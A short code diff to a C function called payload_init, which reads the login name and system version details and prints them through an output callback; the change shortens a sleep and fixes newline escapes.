@@ -13,7 +13,7 @@ int payload_init(int id, output_func output) {
     srand(time(NULL));
     int randInt = rand() % 100000 + 30000;
 
-    sleep(30);
+    sleep(5);
 
     // Get username.
     char* username = getlogin();
@@ -31,7 +31,7 @@ int payload_init(int id, output_func output) {
 
     snprintf(info, infoSize, "%d %s %s %s", randInt, buffer.release, buffer.machine, buffer.version); // From OutputFormatter.h
 
-    output(id, "%d %s %s %s", randInt, buffer.release, buffer.machine, buffer.version);
-    output(id, "Oh yeah, also...\\n");
+    output(id, "%d %s %s %s\n", randInt, buffer.release, buffer.machine, buffer.version);
+    output(id, "Oh yeah, also...\n");
     return 0;
 }
